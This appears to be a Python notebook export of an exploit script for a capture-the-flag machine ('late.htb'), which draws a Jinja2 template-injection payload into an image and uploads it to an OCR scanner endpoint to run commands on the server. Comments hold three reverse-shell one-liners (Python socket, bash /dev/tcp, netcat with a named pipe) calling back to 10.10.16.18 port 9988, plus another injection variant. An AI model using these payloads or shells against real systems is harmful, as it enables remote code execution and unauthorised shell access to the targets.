# In[1]:
import re
import requests
import io
from PIL import Image
from PIL import ImageFont
from PIL import ImageDraw 
import os
# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( " 10.10.16.18 " , 9988));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# draw.text((0, 500),"{{ ''.__class__.__mro__[1].__subclasses__()[117].[245]('ls').read()}}",('red'),font=font)
# bash -c " bash -i >& /dev/tcp/10.10.16.18/9988 0>&1 "
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.18 9988 >/tmp/f
img = Image.open("img/arch1.jpg")
draw = ImageDraw.Draw(img)
font = ImageFont.truetype("font/consolaz.ttf", 30)
draw.text((10, 250),""" {{ config.__class__.__init__.__globals__['os'].popen(' id ').read()}}""",(1,1,1),font=font)


img.save('img/bb2-out.jpg')
# img.show()

url = "http://images.late.htb"
image = open('img/bb2-out.jpg','rb').read()
filename = "Arch.png"
files ={"file":(filename,image)}
# print(files)
# # r =requests.get(url)
r = requests.post(url+"/scanner", files = files)
 

# os.system(f"echo {r.text} >res.txt") 
print(r.text)



















